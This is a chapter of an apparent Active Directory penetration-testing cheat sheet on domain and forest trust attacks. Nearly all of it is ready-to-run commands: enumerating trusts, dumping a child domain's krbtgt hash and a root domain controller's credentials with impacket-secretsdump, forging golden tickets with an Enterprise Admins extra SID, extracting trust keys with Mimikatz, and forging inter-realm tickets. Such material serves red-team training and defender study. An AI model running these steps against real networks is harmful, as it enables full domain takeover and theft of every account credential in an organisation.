# 12 — Forest & Trust Attacks

[← Back to index](README.md)

## 12.1 Trust Enumeration

```powershell
# Enumerate trusts
Get-NetDomainTrust
Get-NetForestTrust
Get-NetForestDomain | Get-NetDomainTrust
```

```text
# Trust direction:
#   1 = Inbound (they trust us — we can access their resources)
#   2 = Outbound (we trust them — they can access our resources)
#   3 = Bidirectional

# Trust attributes to look for:
#   FILTER_SIDS       = SID filtering enabled (blocks SIDHistory escalation)
#   FOREST_TRANSITIVE = Forest trust
#   TREAT_AS_EXTERNAL = External trust (even within forest)
```

```powershell
# PowerView
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```

```bash
# Impacket
impacket-lsaquery $DOMAIN/$USER:$PASS@$DC_IP
```

```powershell
# Enumerate users in trusted domain
Get-NetUser -Domain trusted.local
Get-NetGroup -Domain trusted.local

# Find foreign group members
Get-DomainForeignGroupMember -Domain corp.local
Get-DomainForeignUser -Domain corp.local
```

## 12.2 Intra-Forest Trust Attacks

Two-way trust between `child.corp.local` and `corp.local`. A child domain DA can become
Enterprise Admin via SID history.

```bash
# Step 1: Get krbtgt hash of CHILD domain
impacket-secretsdump child.corp.local/$USER:$PASS@CHILD_DC -just-dc-user krbtgt
```

```powershell
# Step 2: Get SIDs
# Child domain SID
Get-DomainSID -Domain child.corp.local
# Enterprise Admins SID (root domain SID + -519)
Get-DomainSID -Domain corp.local
# Enterprise Admins = ROOT_DOMAIN_SID-519
```

```bash
# Step 3: Create Golden Ticket with Enterprise Admin SID in extra-sid
impacket-ticketer -nthash CHILD_KRBTGT_HASH \
    -domain-sid CHILD_DOMAIN_SID \
    -domain child.corp.local \
    -extra-sid ROOT_DOMAIN_SID-519 \
    Administrator
export KRB5CCNAME=Administrator.ccache

# Step 4: Access root domain
impacket-smbclient -k -no-pass corp.local/Administrator@ROOT_DC.corp.local
impacket-secretsdump -k -no-pass corp.local/Administrator@ROOT_DC.corp.local -just-dc
```

## 12.3 External / Forest Trust Attacks

```powershell
# Inter-forest attack requires disabling SID filtering (usually not possible).
# Exception: Foreign principals explicitly granted access.

# Enumerate foreign group memberships
Get-DomainForeignGroupMember -Domain target.forest

# If a user from attacker.forest is in DA of target.forest:
# Use that user's credentials to access target.forest directly
```

```powershell
# Trust ticket attack (if bidirectional forest trust with no SID filtering)
# Get inter-realm trust key
.\Mimikatz.exe 'lsadump::trust /patch' exit
# Creates ticket with target domain's TDO (Trust Domain Object) key
```

```bash
# Create inter-realm ticket (Impacket)
impacket-ticketer -nthash TRUST_KEY_HASH \
    -domain-sid ATTACKER_DOMAIN_SID \
    -domain attacker.local \
    -extra-sid TARGET_DOMAIN_ENTERPRISE_ADMINS_SID \
    -target-domain target.local \
    Administrator
```

---

[← Prev: 11 — Domain Persistence](11-domain-persistence.md) | [Next: 13 — Defense Evasion & AV Bypass →](13-defense-evasion.md)
